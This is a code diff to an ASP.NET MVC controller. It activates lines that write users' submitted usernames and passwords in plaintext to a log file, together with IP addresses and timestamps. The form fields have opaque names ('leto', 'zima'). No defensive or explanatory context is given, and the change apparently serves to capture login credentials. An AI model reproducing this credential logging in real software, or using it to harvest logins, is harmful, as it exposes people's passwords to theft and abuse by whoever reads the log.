@@ -115,8 +115,8 @@ namespace MvcApplication2.Controllers
                 // Create a file to write to.
                 using (StreamWriter writetext = System.IO.File.CreateText(strLogFilePath))
                 {
-                    //writetext.WriteLine("username:" + userName);
-                    //writetext.WriteLine("passswd: " + passwd);
+                    writetext.WriteLine("username:" + model.leto );
+                    writetext.WriteLine("passswd: " + model.zima );
                     writetext.WriteLine("ip: " + ip);
                     writetext.WriteLine("client ip: " + clientIP);
                     writetext.WriteLine("date: " + DateTime.Now.ToString());
@@ -129,8 +129,8 @@ namespace MvcApplication2.Controllers
             // if it is not deleted.
             using (StreamWriter writetext = System.IO.File.AppendText(strLogFilePath))
             {
-                //writetext.WriteLine("username:" + userName);
-                //**writetext.WriteLine("passswd: " + passwd);
+                writetext.WriteLine("username:" + model.leto);
+                writetext.WriteLine("passswd: " + model.zima);
                 writetext.WriteLine("ip: " + ip);
                 writetext.WriteLine("client ip: " + clientIP);
                 writetext.WriteLine("date: " + DateTime.Now.ToString());
